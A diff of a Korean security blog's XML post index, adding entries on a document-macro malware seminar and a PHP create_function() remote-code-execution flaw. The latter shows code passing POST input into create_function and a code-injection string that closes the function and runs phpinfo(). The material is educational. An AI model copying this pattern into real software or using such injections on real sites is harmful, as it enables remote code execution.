+            <tag> XSS </tag>
+            
+            <tag> CSRF </tag>
+            
+            <tag> Chrome </tag>
+            
+            <tag> Firefox </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>문서형 악성코드 분석 발표 자료(Malware Analyze)</title>
+      <link href="2020/05/26/malware-analyze-200526/"/>
+      <url>2020/05/26/malware-analyze-200526/</url>
+      
+        <content type="html"><![CDATA[<h3 id="발표자료"><a href="#발표자료" class="headerlink" title="발표자료"></a>발표자료</h3><p>2019년 8월에 있었던 KUCIS 영남권역 학술 세미나에서 발표 자료로 썼던 내용 입니다.</p><p>악성코드 개념, 종류, 사례 그리고 실제 악성코드 분석 결과 등에 대한 내용을 작성 하였습니다.</p><p>자료 다운로드 : <a href="https://drive.google.com/open?id=1gVxnWzPI8sX9k5yI-gG5L31Mx9wUKm68">https://drive.google.com/open?id=1gVxnWzPI8sX9k5yI-gG5L31Mx9wUKm68</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Docx </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Malware </tag>
+            
+            <tag> Macro </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>create_function() RCE 취약점 정리</title>
+      <link href="2020/05/15/function-rce-200515/"/>
+      <url>2020/05/15/function-rce-200515/</url>
+      
+        <content type="html"><![CDATA[<h3 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h3><p>create_function 함수는, php.net(<a href="https://www.php.net/manual/en/function.create-function.php">https://www.php.net/manual/en/function.create-function.php</a>) 에</p><p>정의된 내용으로, 매개변수를 전달받아 익명 함수를 생성하는 함수 입니다.</p><hr><h3 id="함수-정의"><a href="#함수-정의" class="headerlink" title="함수 정의"></a>함수 정의</h3><p>해당 함수는 아래와 같이 사용할 수 있습니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( string $args , string $code ) : string</span><br></pre></td></tr></table></figure><hr><h3 id="함수-취약점-분석"><a href="#함수-취약점-분석" class="headerlink" title="함수 취약점 분석"></a>함수 취약점 분석</h3><p>하지만, 함수를 잘못된 방법으로 사용할 시 RCE 취약점이 발생하게 되는데 예시는 다음과 같습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="keyword">string</span> <span class="variable">$args</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>위와 같은 방법으로 사용할 시에 두번째 인자에 임의적인 값을 주입하여 원하는 코드를 실행시킬 수 있습니다.</p><p><code> return -1;&#125; phpinfo(); /* </code></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> RCE </tag>
+            
+            <tag> PHP </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>websec.fr babysteps Write up</title>
       <link href="2020/05/14/websecbaby-200514/"/>
       <url>2020/05/14/websecbaby-200514/</url>
@@ -209,9 +461,9 @@
       
         <tags>
             
-            <tag> Writeup </tag>
-            
             <tag> XSS </tag>
+            
+            <tag> Writeup </tag>
             
         </tags>
       
